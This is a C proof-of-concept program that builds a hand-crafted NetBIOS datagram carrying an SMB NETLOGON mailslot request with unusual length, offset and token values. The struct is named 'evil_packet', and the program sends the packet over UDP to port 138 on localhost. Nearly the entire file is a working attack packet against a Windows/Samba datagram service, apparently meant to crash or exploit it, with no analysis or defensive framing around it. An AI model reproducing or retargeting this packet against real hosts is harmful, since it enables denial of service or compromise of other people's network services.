#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdint.h>

struct evil_packet {
    // ntbios_dtgram
    char mtype;
    char three_in_one;
    int16_t datagram_id;
    in_addr_t src_ip;
    int16_t src_port;
    int16_t dlen;
    int16_t packet_offset;
    /* this is variable from 32-255 */
    char source_name[34];
    char destination_name[34];
    // SMB header
    int8_t header[32];

    // trans request
    int8_t wcount;
    int16_t total_param_count; /* total param count */
    int16_t total_data_count;

    char pad_zero1[8];
    int32_t timeout;
    char pad_zero2[6];
    int16_t data_count;
    int16_t data_offset;
    char scount;
    char reserved;


    //mailslot
    int16_t mail_slot;
    int16_t prio;
    int16_t class;

    int16_t byte_count;

    //mailslot
    char mailslot[23];

    //login
    uint8_t req_from_clients;
    int16_t requests_count;
    int8_t  x;
    int8_t unicode_comp_name[8];
    int16_t user_name;
    char mailslot2[23];
    int32_t account_control;
    int32_t domain_sid;
    int32_t nt_version;
    int32_t tokens;
    } __attribute__ ((__packed__));


void convert_to_netbiosname(const char *const src, char **dst)
{   
    const size_t pad = 15 - strlen(src);
    char pad_buff[(strlen(src) + 1 + pad)];
    memset(pad_buff, 0, strlen(src) + 1 + pad);

    strcpy (pad_buff, src);
    char *p = pad_buff + strlen(src);
    int x;
    for (x = 0; x < pad; ++x)
    {
        *p = ' '; ++p;
    }

    p = pad_buff;

    // +1 for leading space char
    // +1 for NULL char
    // +2 for 2 41 bytes at the end
    char *buff = malloc((strlen(pad_buff) * 2) + 1 + 1 + 2);
    //char buff[(strlen(pad_buff) * 2) + 1 + 1 + 2];
    memset(buff, 0, (strlen(pad_buff) * 2) + 1 + 1 + 2);
    char *p_buff = buff;
    *p_buff = ' '; ++p_buff;

    while (*p != '\0') {
        char b = (char)(*p & 0xff);
        *p_buff = (char)((b >> 4 & 0x0f) + 'A'); ++p_buff;
        *p_buff = (char)((b & 0x0f) + 'A'); ++p_buff;
        ++p;
    }

    *p_buff = 0x41; p_buff++;
    *p_buff = 0x41;

    *dst = buff;
}

int main(int argc, char **argv)
{
    struct sockaddr_in si;
    int slen = sizeof(si);
    memset((char *) &si, 0, sizeof(si));
    si.sin_family = AF_INET;
    si.sin_port = htons(138);
    inet_aton("127.0.0.1", &si.sin_addr);


    const int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror ("failed");
        return EXIT_FAILURE;
    }

    struct evil_packet ep;
    memset(&ep, 0, sizeof(ep));

    ep.mtype = 0x10;
    ep.three_in_one = 0x0e;
    ep.datagram_id = htons(0xcce8);
    ep.src_ip = inet_addr("127.0.0.1");
    ep.src_port = htons(123);
    ep.dlen = htons(213);
    /* packet offset is 0 */

    char *sname = NULL;
    convert_to_netbiosname ("WIN", &sname);
    strcpy(ep.source_name, sname);
    char *dname = NULL;
    convert_to_netbiosname ("SAS", &dname);
    strcpy(ep.destination_name, dname);
    free(dname);

    // SMB header
    memset (ep.header, 0, sizeof(ep.header));
    ep.header[0] = 0xff;
    ep.header[1] = 'S';
    ep.header[2] = 'M';
    ep.header[3] = 'B';
    ep.header[4] = '%';

    // trans request
    ep.wcount = 17;
    ep.total_data_count = htons(0x3500);

    ep.timeout = htonl(0xe8030000);
    ep.data_count =  ep.total_data_count;
    ep.data_offset = htons(0x5c00);
    ep.scount =  3;
    ep.byte_count = htons(0x4c00);

    //mailslot
    ep.mail_slot =  htons(0x0100);
    ep.prio =  htons(0x0100);
    ep.class =  htons(0x0200);
    strcpy(ep.mailslot, "\\MAILSLOT\\NET\\NETLOGON");

    // logon
    ep.req_from_clients = htons(0x1200);

    ep.requests_count = 0;

    memset(ep.unicode_comp_name, 0, 8);
    ep.unicode_comp_name[0] = 'W';
    ep.unicode_comp_name[2] = 'I';
    ep.unicode_comp_name[4] = 'N';
    memset(&ep.user_name, 0, sizeof(int16_t));
    strcpy(ep.mailslot2, "\\MAILSLOT\\NET\\GETDC352");

    ep.nt_version = htons(0x0b00);
    ep.tokens = 0xffffffff;


    sendto(fd, &ep, sizeof(ep), 0, (struct sockaddr *) &si, slen);
    close(fd);

    return EXIT_SUCCESS;
}

